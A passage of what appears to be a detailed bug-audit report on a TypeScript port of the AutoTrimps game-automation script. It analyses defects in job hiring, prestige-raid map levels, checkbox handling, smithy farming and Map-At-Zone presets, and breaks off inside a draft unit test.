```

The fix is one token per site, matching the five existing guards: `if (challengeActive("Metal") === false && !game.jobs.Miner.locked)` at `jobs.ts:231`, `!game.jobs.Farmer.locked` / `!game.jobs.Lumberjack.locked` at `:234`/`:235`, and `&& !game.jobs.Scientist.locked` on the bootstrap arm at `:203`. No balance numbers are touched.

**Strongest counter-argument considered.** **"Faithful to legacy, and the effect is arguably positive."** The frozen oracle bundle (`tests/fixtures/oracle/autotrimps.oracle.user.js:4276-4288`) contains byte-identical logic, so this is long-shipped behaviour, not a port regression. And hiring a locked Miner *produces metal* — you could read it as AT helpfully bootstrapping the player rather than harming them, in which case a "fix" is a deliberate nerf.

**Why it does not survive.** The same function guards this exact purchase in **five** sibling places — `jobs.ts:186` (`!Lumberjack.locked`), `:191` (`!Miner.locked`), `:247` (`checkFireandHire`), `:256` (`!Scientist.locked`), `:284` (`ratiobuy`). Line 191 is the *direct analogue*: the zone-1 bootstrap's Miner buy, guarded. Nobody guards the same buy five times and omits the sixth on purpose. The likely mechanism is that the trickle was written assuming "zone 1 is handled by the arm above, so everything downstream is unlocked" — and the `totalHeliumEarned <= 5000` exclusion at line 182 (a clause #125 actively edited) silently routes veterans' zone 1 into that zone-2+ assumption.

And the "it's beneficial" half is refuted empirically by p18: metal was already 9× over its requirement while wood (the actual blocker) sat at 27%. The locked Miner cost 20 food and one breeding Trimp to over-produce a resource that was not the constraint. The direction of effect is mildly *negative*, not positive.

A second, weaker counter — "the corpus would have caught it" — I checked and it is false: all 12 corpus fixtures have F/L/M/S `locked = 0`, and `11-portal-u1`, the only fixture that portals, has `totalHeliumEarned = 0`, so its post-portal z1 takes the locked-*guarded* arm 182.

---

### Watch-challenge scientist arm subtracts the owned count twice — hiring freezes until the workforce doubles

`src/modules/jobs.ts:214`

**Sim-visible?** It is PINNED, not caught. 03-challenge-watch field-sets challengeActive='Watch' (scripts/sim/make-fixtures.mjs:118), so the wrong values are already recorded in the oracle; baseline-zero would go RED on a fix, not on the bug.

**Trigger.** challengeActive('Watch') (including the Waze C², multiChallenge ["Size","Watch"]) with the colony under 90% of realMax and breedFire off — i.e. the normal early/mid state of a Watch run.

**Actual.** Line 214 computes `buyScientists = floor(target - owned)`, which is already the DELTA (target = totalDistributableWorkers / 10). Line 215 then gates on `owned < buyScientists` and line 216 computes `toBuy = buyScientists - owned`, both of which treat that delta as if it were an absolute target. The gate therefore reduces to `2*owned < target` — the arm only hires while scientists are below HALF the target — and each hire lands the count at `target - owned_prev` instead of `target`. Simulated with divisor 10 and a workforce growing 10%/step from TDW=1000: the count sticks at 90 while the target climbs 100 → 177 (a 49% shortfall) and only resumes once the target passes 2x the current count.

**Expected.** The main (non-Watch) arm 43 lines below gets this right: line 257 computes `buyScientists = floor(target) - owned` and passes that delta straight to safeBuyJob, converging exactly on target. The Watch arm should do the same. (Note it also omits the `!game.jobs.Scientist.locked` guard the main arm carries at line 256.)

**Impact.** DEFAULT-PATH, but only inside the Watch challenge — which is z180+ content, and structurally invisible to the proof net.

Who is affected: every user running `challengeActive('Watch')` — the Watch challenge (unlocks at highestLevelCleared >= 179, config.js:3852) or the Waze C² (`multiChallenge: ["Size","Watch"]`, config.js:4175; `challengeActive` at main.js:1754 returns true for multiChallenge). No AT setting gates it: `ScientistPercent` defaults to '-1' (Auto -> divisor 10) and `MaxScientists` to '-1' (uncapped), so an untouched install runs exactly this code. `breedFire` is hard-false everywhere (main-loop.ts:132, never assigned true), so the `!breedFire` guard offers no protection. It is live for every Watch run, not opt-in.

How badly: not the scientist-count shortfall the finder described (the fall-through to jobs.ts:257 tops scientists up in the same tick). The damage is that the `else return` at jobs.ts:221 fires whenever `T/2 <= S < T`, which — because the same-tick top-up parks S at exactly floor(T) — is the steady state after every catch-up. So `buyJobs()` does NOTHING at all until the worker cap grows 1.909x: no scientists, no Trainers (block), no Explorers, no F/L/M ratio rebalance, no AutoMagmamancers, no job-protection fire. My tick model put that at 38/40 ticks frozen vs 21/40 for the corrected shape, with final F/L/M -31% and Scientists -25%; the Watch challenge's own zone-end `assignExtraWorkers()` partly compensates F/L/M but nothing else, so treat those figures as an upper bound on the F/L/M half and a fair estimate for the rest.

Guarding status: EFFECTIVELY UNGUARDED. The only corpus fixture that arms the branch (03-challenge-watch) has its colony at 99.14% of realMax, so line 213 is false and lines 214-221 never run; all three recordings contain zero Scientist buyJob events. Fixing it will NOT redden baseline-zero, and no existing test covers it — tests/jobs.actuators.test.ts:110 asserts in a comment that L0 already covers this arm, which is itself false and should be corrected alongside any fix.

Severity call: MEDIUM-HIGH for the affected population, LOW blast radius overall (one challenge, late game). Recommend filing rather than shipping a blind fix — the correct patch is mechanical (mirror :257: `let buyScientists = Math.floor(scientistRatio / totalRatio * totalDistributableWorkers) - game.jobs.Scientist.owned`, drop the second subtraction at :216, and add the `!game.jobs.Scientist.locked` guard), but it changes a job-allocation policy in a region the oracle cannot see, so it needs a purpose-built fixture (colony below 90% of realMax under Watch) before it is trustworthy.

**Strongest counter-argument considered.** Three, in descending order of force.

1. DELIBERATE HYSTERESIS. One could argue the legacy author wanted "only top scientists up once they have fallen to half target", to avoid re-hiring churn every tick. This is the only reading under which the code is correct, and it is the strongest defence. It fails on three counts: (a) under that reading line 216 should hire `T - owned`, but it hires `T - 2*owned`, which is not a coherent amount for any target policy; (b) the main arm 43 lines below (:257) shares the variable name `buyScientists`, the same `scientistRatio/totalRatio*TDW` expression and the same `MaxScientists`/`-1` handling, and computes `floor(T) - owned` — the same author writing the same computation the other way in the same function; (c) the fall-through at :222 reaches that main arm and immediately tops up to floor(T) anyway, so the supposed hysteresis is self-defeating within a single tick. A deliberate design that its own next 40 lines undo is not a design.

2. FAITHFUL TO LEGACY. Byte-identical to modules/jobs.js since commit 70f4732a (2019), and CLAUDE.md says to filter "faithful-to-legacy-intended" from genuine defects. But the filter is on INTENDED, and (1) shows intent is not defensible here. This is an inherited bug, not a port regression — it changes the blame, not the verdict.

3. THE SIM WOULD HAVE CAUGHT IT / IT IS ALREADY PINNED. This is the finder's own claim and it is the one thing I actually broke: the fixture's colony sits at 99.1% of realMax, the line-213 gate is false, the block never executes, and all three recordings contain zero Scientist hires. But this refutes the finder's evidence, not the defect — it moves the code from "pinned" to "never exercised", which makes it less safe, not more.

The one thing that genuinely narrows the impact: the game's own Watch mechanic runs `assignExtraWorkers()` at each zone end (config.js:3849 "any unassigned Trimps will be split evenly amongst Farmer, Lumberjack, and Miner"; dispatched at main.js:13221 under `!getAutoJobsSetting().enabled`), which refills F/L/M during the freeze. So the F/L/M starvation is partly masked by the challenge itself. Scientists, Trainers, Explorers and Magmamancers are not.

---

### The prestige-raid extra-zone value is never clamped to the game's 0-10 option set, so out-of-range targets silently create maps at the current world zone

`src/modules/mapfunctions-amp.ts:84`

**Sim-visible?** No. Praiding is off in every fixture (RAMPraid=false, RAMPraidzone=[-1]) and maps.ts:1183 gates on RAMPraidzone[0] > 0, so RAMPplusPres is never called. The corpus also tops out at z62, below typical praid zones.

**Trigger.** Any PR: Zone / PR: Raid pair (or DPR: Zone / DPR: Raid) whose gap is outside [4, 10]. Gap > 10 (e.g. PR: Zone 95, PR: Raid 110) breaks all five maps; gap < 4 (e.g. PR: Zone 95, PR: Raid 98) breaks the bottom maps. Nothing in settings-defs.ts, settings-visibility.ts or MAZ.ts validates or clamps the pair, and the RAMPraidraid tooltip ('raids every prestige between zone 95 and 105') actively invites a wide span while the code only ever makes five maps.

**Actual.** RAMPplusMapToRun (line 61) returns `raidzones - game.global.world - number` with number in 0..4, and line 84 (also 181, 194) writes `String(...)` straight into `advExtraLevelSelect`. setAdvExtraZoneText (main.js:6236-6248) only ever builds options 0..10, so any other value makes the select's value the empty string; getExtraMapLevels (main.js:6312-6317) does `if (!value) return 0`, and createMap (main.js:5994) does `world += getExtraMapLevels()`. Worked numbers (node): PR:Zone 95 / PR:Raid 110 -> extras [15,14,13,12,11] -> select accepts [0,0,0,0,0] -> intended map levels [110,109,108,107,106] but ACTUAL [95,95,95,95,95]. PR:Zone 95 / PR:Raid 98 -> extras [3,2,1,0,-1] -> accepts [3,2,1,0,0] -> intended [98,97,96,95,94], ACTUAL [98,97,96,95,95] (a duplicate). Meanwhile RAMPshouldrunmap (line 74-78) decided to buy based on Rgetequips(raidzones - number) at the INTENDED zone, and updateMapCost silently drops the 10-per-extra-level surcharge, so the affordability check always passes and the buy always 'succeeds'. AT pays for, runs and marks-done five maps that cannot carry the prestiges it went there for. Trace is stable: same wrong maps every raid.

**Expected.** Clamp/validate the computed extra to 0..10 (the game's own range) before writing it, and skip or refuse the map when the target is unreachable, instead of letting the DOM silently coerce it to 'no extra zones'. The valid configuration window (PR: Raid - PR: Zone in [4,10]) should also be enforced or documented at the setting.

**Impact.** **Opt-in, U2/radon-only, deep-game — but total within its region, and silent.**

Requires all of: U2 (radon) active; `RAMPraid` flipped on (`boolean`, default `false`, `settings-defs.ts:1713`); the user opening **Praiding Settings** and entering a zone/raid pair whose gap falls outside [4,10]. `RAMPraidzone`/`RAMPraidraid` rows are permanently `turnOff`'d in the settings list (`settings-visibility.ts:584-586`), so the MAZ popup — the one surface with no validation — is the only way in.

For a user in that state the entire Prestige Raiding feature degenerates and reports success:
- gap > 10 → **all five** maps collapse to the current world zone (worked: 95/115 → five level-95 maps instead of 111-115);
- gap == 11 → only the top map breaks, the other four are correct — the hardest variant to notice;
- gap < 4 → the bottom maps collapse and duplicate (95/98 → `[98,97,96,95,95]`);
- the fragment-farming decision (`RAMPfrag` → `RAMPplusPresfragmin/max`, lines 179-386) is priced on the collapsed map, ~9.05e5× too cheap, so it always answers "no farming needed";
- with `PR: Recycle` on, `RAMPreset` then recycles the five wrong maps, erasing the evidence.

Same defect, same three lines, on the Daily path (`RdAMPraidzone`/`RdAMPraidraid` via `dRAMP`).

**Proof-net status: structurally invisible.** Not a "the sim didn't happen to cover it" — the corpus's only settings fixture has praiding off, and the deepest save is z62. `baseline-zero` is not evidence about this code.

**Not a balance change.** The fix is a mechanism clamp to the game's own published 0-10 range plus a refusal (or a skip) when the target is unreachable — no game constant is touched. Recommended clamp shape is already in-repo twice: `other-praiding.ts:1223` and `MAZ.ts:481`.

**Strongest counter-argument considered.** **Three, and none of them break it.**

**(a) It is byte-faithful to the pre-conversion legacy.** I verified this: `git show d283f152:legacy/modules/mapfunctions.js:459-470` is character-identical to today's `RAMPplusMapToRun`. So this is not a TypeScript-conversion regression — it is an inherited defect, and blame does not sit with #51. That lowers the urgency, not the reality; this repo files inherited defects as bugs (#153 was a seven-year-old false comment that froze a subsystem).

**(b) "A gap outside [4,10] is user misconfiguration."** This is the strongest genuine objection, and it is the one I tried hardest to make stick. It fails on four counts: the input is an unbounded `<input type='number'>` with no `min`/`max`; `settingsWindowSave` bound-checks `zone`, `cell` *and* `level` but pointedly not `setting`; no tooltip, label or popup text states the 10-zone ceiling; and the two nearest siblings in this very repo (`other-praiding.ts:1223`, `MAZ.ts:481`) treat exactly this value as something that must be clamped. Above all, the failure is **silent and success-shaped** — AT buys five maps, runs five maps, skips the "Failed to Prestige Raid" branch at `:611`, and recycles them. A user cannot distinguish a working raid from a collapsed one without reading map levels.

**(c) "The maps still yield prestiges, so nothing is lost."** True and worth stating precisely: a level-95 Prestigious map is not worthless, it just yields the tier the player already has. The user asked to raid 111-115 and got five redundant level-95 maps plus five recycles. So the honest impact is "raids the wrong zone five times over", not "gets nothing".

**(d) "The sim would have caught it."** It would not, and I checked rather than assumed: the only settings fixture, `tests/fixtures/at-settings/p18-z2-balance-stall.json`, has `RAMPraid=false`, `RAMPraidzone=[-1]`, `RdAMPraid=0`, and `maps.ts:1183` gates on `getPageSetting('RAMPraidzone')[0] > 0`. `RAMPplusPres` is never called in the corpus.

---

### `advPerfectCheckbox.checked = ...` is a no-op: the element is a <span> and the game reads data-checked, never .checked

`src/modules/mapfunctions-amp.ts:89`

**Sim-visible?** No. RfragMap is reachable from other (non-praid) paths, but the AMP invocation at lines 505/681 requires RAMPraid + RAMPraidfrag > 0, both off in every fixture. The module-local writes at 89/186/199 are behind the same praid gate.

**Trigger.** Any time AT designs an advanced map. In this module (lines 89, 186, 199) the intent is 'perfect OFF'. The write is dead everywhere, but the consequence is live on the AMP fragment-farm path: RAMP() line 505 and dRAMP() line 681 call RfragMap(), which sets sliders 9/9/9 (sum 27, so the perfect option is actually eligible) and then does `byId("advPerfectCheckbox").checked = true` (mapfunctions.ts:276) and `= false` (mapfunctions.ts:285).

**Actual.** advPerfectCheckbox is `<span id="advPerfectCheckbox" class="icomoon icon-checkbox-unchecked niceCheckbox" data-checked="false" onclick="swapNiceCheckbox(this); updateMapNumbers()">` (index.html:897; same in ScreenReader.html:907 and indexKong.html:1000 — always a span, never an <input>). The game's only reader is checkPerfectChecked (main.js:6303-6307) -> readNiceCheckbox (updates.js:1958-1960) -> `elem.dataset.checked == "true"`. Assigning `.checked` on a span creates an inert expando; data-checked is untouched. The effective value is therefore always whatever resetAdvMaps() last wrote via swapNiceCheckbox (main.js:6134) from the user's map preset `perf` flag — and resetAdvMaps runs on every entry to the Map Chamber (main.js:10872). Net effect on the AMP frag-farm map: with the default preset (perf off) AT never gets the perfect roll it asked for, so getRandomMapValue (main.js:6563-6565) rolls loot randomly instead of returning max; with a preset that has perf on, AT cannot turn it off at mapfunctions.ts:285 when the map is unaffordable, losing a rung of its degradation ladder. Within mapfunctions-amp itself the three writes are inert-but-harmless, because RAMPplusPres sets loot to 0 so checkMaxSliders() (main.js:6698) can never reach 27 and checkPerfectChecked() returns false regardless.

**Expected.** Use the game's own setter: `swapNiceCheckbox(byId('advPerfectCheckbox'), false)` (updates.js:1932-1943), which writes data-checked / aria-checked / the icon class. If the intent in this module really is 'perfect is irrelevant here', delete the three dead writes rather than leave a line that reads as if it controls something.

**Impact.** Split by site, because the finding's cited lines and its live lines differ.

CITED LINES — mapfunctions-amp.ts:89 / 186 / 199: ZERO runtime impact, now and under any reachable state. Dead-and-inert (loot slider pinned to 0 => sum <= 18 => checkMaxSliders false). Disposition is deletion of three misleading lines, not repair. Additionally behind default-off gates (RAMPraid boolean false, RAMPraidfrag multitoggle 0 — settings-defs.ts:1705/1724), so doubly unreachable on the corpus.

LIVE LINES — mapfunctions.ts:276/285 (RfragMap) and 331/341 (RminFragMap): DEFAULT-PATH for U2 players, not opt-in. Reached from maps.ts:1500 and mapfunctions.ts:866/1059/1188/1348 (frag / insanity / alch / hypo / ship farming), none praid-gated. Requires U2 with highestRadonLevelCleared >= 29 (getUnlockZone('perfect'), main.js:6176) — i.e. essentially every deep U2 run. Per-purchase harm is small: default preset (perf:false) means AT never gets the perfect map it asks for (+1.9% loot, -9.1% size, -5.7% difficulty foregone) but also never pays the 2.345x surcharge; a perf-ON preset costs one difficulty slider notch (9/8/9 instead of 9/9/9), self-healing because sum 26 != 27 drops perfect anyway. No stuck state, no failed purchase, no infinite retry.

OTHER SITES — other-praiding.ts x13 (module listed as already swept, but these 13 writes are the same defect and 1321/1334 sit on the same 9/9/9 shape, so likely live).

SIM VISIBILITY: none, and not for the reason the finder gives. Even on fixtures that DO reach RfragMap, the oracle was recorded from this same buggy code, so baseline-zero pins what AT did rather than whether it was right. Green there is not evidence.

RECOMMENDED FILING: re-anchor to mapfunctions.ts:276 as the primary site with mapfunctions-amp.ts:89/186/199 and other-praiding.ts as dead-code cleanup, and add a derived source net (scan .trimps-game/*.html for ids carrying class "niceCheckbox", assert no `.checked =` write to any of them under src/) so the class cannot regrow.

**Strongest counter-argument considered.** The strongest refutation is against the LOCATION, not the mechanism: at mapfunctions-amp.ts:89/186/199 the write cannot matter even if it were repaired. All three functions pin `lootAdvMapsRange = "0"`, so the slider sum can never exceed 18, and checkMaxSliders (main.js:6549) demands exactly 27 — checkPerfectChecked short-circuits at checkSlidersForPerfect and never reads the checkbox. A patch to those three lines is provably behaviour-neutral. So a reviewer could fairly say the finding, as filed against mapfunctions-amp.ts:89, is dead code with zero consequence, and its cited consequence belongs to a different module (mapfunctions.ts:276/285). I did not accept this as a REFUTE because the finder discloses the inertness itself and correctly traces the live path, and because the underlying defect survived every attempt to break it.

Two weaker counter-arguments I also tested and rejected: (a) "faithful to legacy" — true (git show d283f152:legacy/modules/mapfunctions.js has the identical writes), but the legacy intent is unambiguous from the code itself and the game changed under it in 4.9, so it is an inherited defect, not intended behaviour; (b) "the sim would have caught it" — it structurally cannot, because the oracle was recorded from this same code, so the differential pins what AT DID rather than whether it was right, and the perfect flag changes map roll quality and fragment spend rather than which native mutator fires.

One genuine mitigation that materially shrinks the harm: for a perf-ON user the lost rung is recovered by the very next loop iteration, because dropping difficulty 9->8 makes the slider sum 26 and the game drops perfect on its own. The cost is one difficulty notch, not an unaffordable map.

---

### RmapLevelCalc's two deepest de-escalations (-3 and -2) are unreachable — the cascade of non-exclusive `if`s overwrites them with -1

`src/modules/mapfunctions.ts:507`

**Sim-visible?** No. RmapLevelCalc has exactly one caller, RsmithyCalc, which is only reached from RsmithyFarmMap/RselectSmithy behind `Rsmithyfarm` (default false, settings-defs.ts:1504). The corpus never enables it, and the deepest fixture is z62.

**Trigger.** Smithy Farming active (`Rsmithyfarm` on, current zone in `Rsmithyfarmzone`, target Smithies > owned) while badly under-damaged: `RcalcHDratio() / 1.5 >= 5000`, i.e. an H:D ratio of 7,500 or worse. This is exactly the state the ladder was written for.

**Actual.** Lines 507-509 are three separate `if` statements, not an `else if` chain, and they are ordered from the largest threshold to the smallest: `if (HD >= 10000) level = -3; if (HD >= 5000) level = -2; if (HD >= 500) level = -1;`. Any HD that satisfies 10000 also satisfies 5000 and 500, so the last assignment always wins. `level` can only ever be -1 on the negative side; -2 and -3 are dead stores. The positive side (510-518) is ordered the other way (largest threshold first, smallest last) and therefore works correctly, which is what makes the negative side's ordering an evident transcription error rather than intent.

**Expected.** The negative ladder should mirror the positive one — the most extreme threshold must be tested last (or the chain made `else if`) so that HD >= 10000 yields -3 and HD >= 5000 yields -2. Consumed by RsmithyCalc(level=true) → RsmithyFarmMap:568 (`mapLevelInput = world + levelzones`) and RselectSmithy:1656, so the bug costs 2 map levels of relief exactly when AT is most overmatched, and RselectSmithy simultaneously looks for an owned map at world-1 instead of world-3.

**Impact.** **Opt-in setting, U2 only, deep/extreme state — real defect, LOW blast radius.**

Gated by `Rsmithyfarm` (`settings-defs.ts:1504`, `'boolean'`, default `false`) and rendered only when `radonon` (`settings-visibility.ts:524`), so it is U2/Radon-exclusive and off for every default user. Even with it on, `Rsmithyfarm{zone,cell,amount}` default to `[-1]`, which never matches a live zone — the user must configure the Smithy Farm popup for any of this code to run at all.

Corpus visibility: ZERO. Only 1 of the 15 fixture saves has an `at-settings` file, and its `Rsmithyfarm` is `false`; the deepest fixture is z62 and there are no Mayhem/Pandemonium/Desolation completion states that would push H:D past 7500. `baseline-zero` cannot see this region — a green net here is not evidence.

When it does fire (a configured U2 Smithy Farm zone with H:D ≥ 7500), AT builds and selects a farming map at `world-1` instead of `world-3` — **6.5× more enemy health** at z40–z70, **15.3× at z62** — precisely when AT is most overmatched and the relief is most needed. It cannot crash and cannot corrupt state; it silently under-corrects. Both consumers are affected identically: `RsmithyFarmMap()` (mapfunctions.ts:568, `mapLevelInput = world + levelzones`) and `RselectSmithy()` (:1660, searches `mapsOwnedArray` for `world + levelzones`).

Fix cost is XS — reorder three lines. Note for whoever ships it: `tests/fixtures/src-bundle.golden.js:9864` is a bundle-text snapshot containing this function and will need regenerating; the oracle traces should NOT move (no fixture reaches this code).

**Strongest counter-argument considered.** Two real ones.

(1) **"Faithful to legacy — not a conversion regression."** True: the TypeScript is byte-faithful to the pre-conversion `legacy/modules/mapfunctions.js` and to upstream's own 2022 commit, and the oracle bundle (`tests/fixtures/oracle/autotrimps.oracle.user.js:8823`) contains the identical cascade. One could argue upstream deliberately capped de-escalation at -1. **Rebuttal:** the `3172c138` diff shows -3/-2 as live `return`s in the line immediately above, and the author LEFT both assignments in place. A deliberate cap deletes the lines; it does not leave two unreachable stores behind. The same commit demonstrates the author understood and wanted last-write-wins (that is what revived rungs 1–8) — they just did not re-order the negative half to match.

(2) **"HD ≥ 5000 (H:D ratio ≥ 7500) may never occur."** In normal U2 play H:D hovers near 1 (`RMapDamageCutoff` default `'1'`; the status tooltip in `settings-menu.ts:53` says "Above 16 will trigger farming"). HD 5000 is being ~9 zones over-extended. **Rebuttal:** AT's own `RcalcEnemyHealth` (`calc.ts:1606-1617`) multiplies enemy health by `Mayhem.getEnemyMult()` = `3^mayhemCompletions`, `Pandemonium.getBossMult()` = `(1+10·pandemonium)·5^pandCompletions`, and `Desolation.getEnemyMult()` = `10^desoCompletions` — I read all three in `.trimps-game/config.js:5065`, `:5676`, `:6179`. Multi-thousand H:D is routine in U2 challenge runs, and the author's own `HD >= 500` rung (~7 zones over-extended) proves the deep range was expected to be visited. What I could NOT prove is a Smithy-Farm state co-occurring with HD ≥ 5000 in this corpus — `Rsmithyfarm` is absent or `false` in every fixture (only `tests/fixtures/at-settings/p18-z2-balance-stall.json` even carries the key, and it is `false`), and `Rshould()` (mapfunctions.ts:1526) ranks `mayhem`/`panda`/`deso` ABOVE `smithy`, so the biggest H:D inflators partly route elsewhere. So the frequency is unmeasured; the dead store is not.

Neither counter survives. Both concede the two rungs are unreachable.

---

### RsmithyCalc has no return path for the affordable case, so RsmithyFarmMap writes `undefined` into the biome select — the game then double-prices a map it builds as a nameless "All" location

`src/modules/mapfunctions.ts:561`

**Sim-visible?** No. Reached only through RsmithyFarmMap, gated by `Rsmithyfarm` (default false). It is also a pricing/naming defect on a map AT still buys, so even if a fixture enabled it, buyMap would appear in the trace either way — the differential pins that AT bought a map, not what it cost.

**Trigger.** Smithy Farming parked at its zone/cell with `smithyzones > game.buildings.Smithy.owned` (so `Rshouldsmithyfarm` is true) AND `canAffordBuilding("Smithy", …, goal)` true — i.e. you have banked enough for the remaining Smithies. This is not a one-tick race: `buildBuilding` (.trimps-game/main.js:4951) increments `owned` only when the build QUEUE completes, while `purchased` increments at buy time (main.js:4858), and safeBuyBuilding refuses while `isBuildingInQueue(building)` (buildings.ts:78). So `afford && owned < target` holds for the entire Smithy build duration, every time.

**Actual.** RsmithyCalc's four result blocks (538, 544, 550, 556) are all guarded by `!afford`. When `afford` is true and `level` is false, control falls off the end of the function at 561 and returns `undefined`. RsmithyFarmMap then executes `biomeAdvMapsSelect.value = undefined` (572) and `advSpecialSelect.value = String(undefined)` (573). Neither string matches an option, so both selects end up with `value === ""` (verified in jsdom: assigning `undefined` gives `""`, selectedIndex -1). The game reads those selects RAW in two places: `updateMapCost` (main.js:6542) does `if (biomeAdvMapsSelect.value != "Random") baseCost *= 2` — `"" != "Random"` is true, so the map is priced at DOUBLE — and `getRandomMapName` (main.js:8114-8122) takes the same non-Random path, builds an empty `possibilities` array, and returns `suffix = undefined`, producing a map named "<prefix> undefined" whose `location` falls back to "All". gather.ts:321 also does `setGather(RsmithyCalc(false,false,false,true))` = `setGather(undefined)`, which the game silently no-ops (main.js:4472), so the farm's gather target is never set either.

**Expected.** RsmithyCalc must return a usable biome/special/gather when the goal is already affordable (or RsmithyFarmMap must not assign a possibly-undefined value into the DOM). Every other value RsmithyFarmMap can produce is a real biome string; `undefined` is the only one the game mis-prices.

**Impact.** Opt-in and U2-only, and effectively unguarded. `Rsmithyfarm` is `'boolean'` default `false` (settings-defs.ts:1504-1507) and only renders when `radonon` (settings-visibility.ts:523); the zone/cell/amount arrays default `[-1]` and must be configured through the MAZ popup. No fixture in the 12-save corpus enables it, so the L0 differential has zero evidence about this code — and even if one did, `buyMap` appears in the trace either way (the biome/special are not in the trace), so the net could not see it. Within the opt-in U2 population on DEFAULT AutoBuildings: rare — one tick per Smithy-affordability crossing, which must land on the one premaps-"create" tick per map cycle (~1/300 ticks); a handful of crossings per farm session, so on the order of a low-single-digit percent chance of one wasted map per session. Cost of an occurrence: one map bought at the ×2 biome premium with location "All" and no cache (13× cheaper than intended per the fragment computation, i.e. the cache costIncrease is silently dropped), plus one tick where `setGather` no-ops and jobs skip the all-in assignment. Nothing gets stuck; the next create tick is normal. Sustained/permanent ONLY in configs where AT can never buy the Smithy — `RBuyBuildingsNew` off, Hypothermia with `Rhyposhouldwood === false`, or Smithy still locked at the configured farm zone — and in each of those the farm parks forever regardless of this bug. Fix is one line (a default return at 561); worth filing as low-severity correctness, not as a live player-facing regression.

**Strongest counter-argument considered.** The strongest case for REFUTED is that the stated trigger cannot happen as described, and I proved that: AT prices the goal off `purchased` (which the buy increments) while measuring the goal off `owned`, so the post-purchase state the claim relies on is precisely the state where `afford` is FALSE (×50 for goal=1, ×2550 for goal=2 — numbers above). Add that AT buys a Smithy on every tick it can afford one, and the window collapses from "the entire build duration, every time" to a single tick per crossing. A second counter is that the sustained variants I could construct (AutoBuildings off, Hypothermia's `Rhyposhouldwood === false`, Smithy still locked at the farm zone) are all configs in which the Smithy Farm can never terminate anyway — the missing return is the second-worst thing happening. A third: `RselectSmithy` (mapfunctions.ts:1657) also gets `undefined` for `special`, and `mapsOwnedArray[m].bonus == undefined` is TRUE for any cache-less map, so on the affordable tick it often returns an existing map id and never enters the create branch at all — which suppresses the bug on many of the very ticks that could trigger it. What survives all of this is the code fact: a function with four conditional returns, no default, whose result is assigned straight into `<select>.value` and passed to `setGather`. The state is constructible, the game's handling of it is silent, and no gate covers it.

---

### U1 Map-At-Zone mirror reads the raw `.setZone` array instead of the game's `getSetZone()`, so it uses the INACTIVE preset and ignores each row's `on` flag

`src/modules/maps.ts:483`

**Sim-visible?** No. `mapAtZone.enabled` defaults to 0 and `canMapAtZone` requires the MapAtZone void-map upgrade; preset B additionally requires the `maz` Fluffy talent. Nothing in a 12-save/z62 corpus arms this, so baseline-zero cannot distinguish right from wrong here.

**Trigger.** Universe 1, `game.options.menu.mapAtZone.enabled == 1` and `game.global.canMapAtZone` true (the MapAtZone void-map upgrade is owned). Two independent triggers: (a) the user has swapped MaZ to preset B (`U1Mode == 'b'`, via `mapAtZone.swapPreset()`, unlocked by `game.talents.maz.purchased`); (b) any MaZ row whose enable checkbox is unticked (`on: false`).

**Actual.** `vanillaMapatZone` is computed at line 481, then lines 483-486 iterate `game.options.menu.mapAtZone.setZone` directly and set `shouldDoMaps = true` on `world == setZone[x].world` alone. `.setZone` is only the U1 preset-**A** array; when `U1Mode == 'b'` the game is driving off `.setZoneB` and `.setZone` still holds the stale rows (factory default `[{world: 200}]`). The loop also never consults `.on`, `.cell`, or `.through`. Net effect: AT forces map-mode at the wrong zone forever (and, via `vanillaMapatZone` in the keep-repeat OR-list at line 665, keeps repeating maps there), and never at the zones the user actually configured. Disabled rows still fire.

**Expected.** Call `game.options.menu.mapAtZone.getSetZone()` (config.js:1435 — the accessor that resolves universe + A/B mode) and honour `on !== false`, exactly as the game's own driver `checkMapAtZoneWorld()` does (main.js:13397 `getSetZone()`, main.js:13407 `currentSetting[x].on !== false`) — and exactly as this same file already does 650 lines later for U2 (`RautoMap`, maps.ts:1132 `getSetZone()`).

**Impact.** Opt-in and deep-game; LOW-to-MEDIUM. Requires all of: Universe 1, AT `AutoMaps` on (multitoggle, default 1 — the one default-on ingredient), the MapAtZone void-map upgrade owned (config.js:9915, world 150 "Auspicious Presence Part III", so z150+ minimum — but it survives portals, so any post-150 veteran has it), and the user turning `mapAtZone.enabled` on (game default 0). Given those, the two triggers differ sharply in reach: the `on: false` trigger needs only one unticked "Active?" row and NO talent, so it is open to every z150+ player; the preset-B trigger additionally needs the tier-6 Fluffy talent `maz` ("Map at Zonier", config.js:2195) plus a preset swap. Consequence when it fires is severe for that user — AT parks in maps permanently at a zone they did not configure and never reaches the one they did (proved unclearable: 8 reachable states, 0 in which SkipSpires can undo it). Mitigating: AT's own AutoMaps tooltip tells users not to run MaZ alongside AutoMaps, so the affected population is those who ignore it. Evidence coverage is nil in both directions — all 15 save fixtures have canMapAtZone=false / mazEnabled=0 so the L0 net cannot see it, and the only MaZ unit fixture exercises the U2 path. Inherited verbatim from legacy (e1bff88e~1 maps.js:373), so not a strangler regression.

Failing test (write no files; this is the test that fails today) — tests/maps.mapAtZonePreset.test.ts, a differential on U1Mode so it is immune to whatever else sets shouldDoMaps in the same fixture. Belongs beside the existing RautoMap MaZ test at tests/maps.characterization.test.ts:479, reusing that file's makeMinimalGame + mutator-spy idiom:

// @vitest-environment jsdom
import { describe, it, expect, beforeEach } from 'vitest'
import { makeMinimalGame } from './harness/gameFixture'

// Faithful copy of the game's accessor, .trimps-game/config.js:1435.
function mazFixture(U1Mode: 'a' | 'b') {
  const row = (o: any) => ({ world: 200, through: 1000, cell: 100, times: -1, on: true, ...o })
  return {
    enabled: 1, U1Mode, U2Mode: 'a',
    setZone:  [row({ world: 200 })],   // preset A: the FACTORY default, untouched
    setZoneB: [row({ world: 250 })],   // preset B: what the user actually configured
    setZoneU2: [row({ world: 10 })], setZoneU2B: [row({ world: 10 })],
    getSetZone(this: any) {
      if ((globalThis as any).game.global.universe == 2)
        return this.U2Mode == 'a' ? this.setZoneU2 : this.setZoneU2B
      return this.U1Mode == 'a' ? this.setZone : this.setZoneB
    },
  } as any
}

// Arms autoMap() with every OTHER shouldDoMaps reason quiet, then returns the flag.
function shouldDoMapsAt(world: number, maz: any) {
  ;(globalThis as any).autoTrimpSettings = { AutoMaps: { type: 'value', value: 1 } }
  ;(globalThis as any).game = makeMinimalGame({
    global: {
      world, universe: 1, mapsUnlocked: true, canMapAtZone: true, challengeActive: '',
      mapsActive: false, preMapsActive: false, spireActive: false, totalVoidMaps: 0,
      mapBonus: 99, lastClearedCell: 0, repeatMap: false, runningChallengeSquared: false,
    },
    options: { menu: {
      repeatUntil: { enabled: 0 }, exitTo: { enabled: 0 }, repeatVoids: { enabled: 0 },
